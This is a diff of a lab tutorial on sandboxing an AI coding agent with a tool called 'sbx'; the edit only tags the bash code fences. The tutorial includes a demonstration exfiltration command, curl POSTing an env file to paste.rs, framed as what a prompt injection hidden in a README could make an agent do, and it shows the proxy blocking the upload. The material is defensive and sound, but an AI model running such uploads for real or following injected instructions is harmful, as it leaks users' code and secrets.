@@ -47,13 +47,13 @@ graph LR
 
 1. Switch to the sample application directory (the lab starts at the root of the cloned repository):
 
-    ```bash
+    ```bash id=host
     cd project
     ```
 
 2. Create your agent's sandbox. `--kit` adds the Python kit you read in the *Kits* module to the Copilot kit, and the workspace path (`.`) is the folder that gets mounted into the sandbox:
 
-    ```bash
+    ```bash id=host
     sbx create --name quickstart --kit ./kits/python copilot .
     ```
 
@@ -61,19 +61,19 @@ graph LR
 
 3. Confirm that it was created by listing all sandboxes:
 
-    ```bash
+    ```bash id=host
     sbx ls
     ```
 
 4. Python is already installed, before any agent runs:
 
-    ```bash
+    ```bash id=host
     sbx exec quickstart python3 --version
     ```
 
 5. Look at the policies:
 
-    ```bash
+    ```bash id=host
     sbx policy ls
     ```
 
@@ -85,7 +85,7 @@ Before you hand this sandbox to an agent that runs without asking for confirmati
 
 1. **Your token isn't there.** Look for it in the sandbox's environment:
 
-    ```bash
+    ```bash id=host
     sbx exec quickstart sh -c 'env | grep _TOKEN='
     ```
 
@@ -93,7 +93,7 @@ Before you hand this sandbox to an agent that runs without asking for confirmati
 
 2. **Your files aren't there, apart from the workspace.** Look at where the agent works, and at its home folder:
 
-    ```bash
+    ```bash id=host
     sbx exec quickstart sh -c 'pwd; ls -A ~'
     ```
 
@@ -101,13 +101,13 @@ Before you hand this sandbox to an agent that runs without asking for confirmati
 
 3. **It can't send your code anywhere you didn't allow.** Imagine that a malicious instruction, hidden in a README or an issue, convinced the agent to upload a file to a paste site. Try it yourself:
 
-    ```bash
+    ```bash id=host
     sbx exec quickstart curl -sS -X POST --data-binary "@backend/.env.example" https://paste.rs
     ```
 
     The proxy answers with `Approval required for paste.rs:443.`: the upload never left your machine. Don't approve it. Find it in the sandbox's network log:
 
-    ```bash
+    ```bash id=host
     sbx policy log quickstart
     ```
 
@@ -115,7 +115,7 @@ Before you hand this sandbox to an agent that runs without asking for confirmati
 
 1. With the sandbox created, start an agent in it and attach to it:
 
-    ```bash
+    ```bash id=host
     sbx run --name quickstart
     ```
 
